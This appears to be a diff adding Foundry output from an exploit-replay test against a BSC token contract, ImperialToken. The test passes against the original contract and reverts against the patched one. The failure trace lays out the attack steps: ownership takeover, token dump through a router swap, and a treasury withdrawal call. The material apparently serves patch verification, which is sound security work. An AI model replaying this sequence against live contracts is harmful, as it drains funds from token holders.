@@ -1,0 +1,80 @@
+===== original batch =====
+Compiling 20 files with Solc 0.8.26
+Solc 0.8.26 finished in 423.90ms
+Compiler run successful!
+2026-10-09T13:14:55.450131Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/126642022"
+
+Ran 1 test for test/Original_0.t.sol:ExploitOriginal_0
+[PASS] testExploit() (gas: 288688)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 26.61s (6.79s CPU time)
+
+Ran 1 test suite in 35.76s (26.61s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+
+===== patched batch =====
+Compiling 1 files with Solc 0.8.26
+Solc 0.8.26 finished in 388.13ms
+Compiler run successful!
+2026-10-09T13:15:29.759835Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/126642113"
+
+Ran 1 test for test/Patched_0.t.sol:ExploitPatched_0
+[FAIL: ImperialToken: discretionary treasury withdrawal disabled] testExploit() (gas: 259105)
+Traces:
+  [259105] ExploitPatched_0::testExploit()
+    ├─ [0] VM::startPrank(0xE44d394BB296739739617497aaD26c9117A43c77)
+    │   └─ ← [Return]
+    ├─ [7695] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::transferOwnership(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ emit OwnershipTransferred(previousOwner: 0xE44d394BB296739739617497aaD26c9117A43c77, newOwner: ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [700] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::owner() [staticcall]
+    │   └─ ← [Return] ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ [0] VM::startPrank(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Return]
+    ├─ [25192] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [191600] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(10000000000000000000000 [1e22], 0, [0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1791551725 [1.791e9])
+    │   ├─ [119273] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::transferFrom(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1, 10000000000000000000000 [1e22])
+    │   │   ├─ emit Transfer(from: ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f, value: 1500000000000000000000 [1.5e21])
+    │   │   ├─ emit Transfer(from: ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1, value: 8500000000000000000000 [8.5e21])
+    │   │   └─ ← [Return] true
+    │   ├─ [2531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2893] 0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1::getReserves() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e3c9fd0803ce80000000000000000000000000000000000000000000000000069e10de76676d0800000000000000000000000000000000000000000000000000000000000006ac8e8ed
+    │   ├─ [1450] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::balanceOf(0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1) [staticcall]
+    │   │   └─ ← [Return] 1000008500000000000000000000 [1e27]
+    │   ├─ [52780] 0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1::swap(0, 4239339055703981449 [4.239e18], ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [27971] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4239339055703981449 [4.239e18])
+    │   │   │   ├─ emit Transfer(from: 0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1, to: ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4239339055703981449 [4.239e18])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1450] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::balanceOf(0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1) [staticcall]
+    │   │   │   └─ ← [Return] 1000008500000000000000000000 [1e27]
+    │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x5099715E3a5c3ebC70ffC11c8a255a1ada4266e1) [staticcall]
+    │   │   │   └─ ← [Return] 499995760660944296018551 [4.999e23]
+    │   │   ├─ emit Sync(reserve0: 1000008500000000000000000000 [1e27], reserve1: 499995760660944296018551 [4.999e23])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 8500000000000000000000 [8.5e21], amount1In: 0, amount0Out: 0, amount1Out: 4239339055703981449 [4.239e18], to: ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop]
+    │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 4239339055703981449 [4.239e18]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [1450] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::balanceOf(0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::startPrank(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Return]
+    ├─ [4233] 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f::withdrawAllToOwner(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Revert] ImperialToken: discretionary treasury withdrawal disabled
+    └─ ← [Revert] ImperialToken: discretionary treasury withdrawal disabled
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 28.46s (3.02s CPU time)
+
+Ran 1 test suite in 30.34s (28.46s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Patched_0.t.sol:ExploitPatched_0
+[FAIL: ImperialToken: discretionary treasury withdrawal disabled] testExploit() (gas: 259105)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
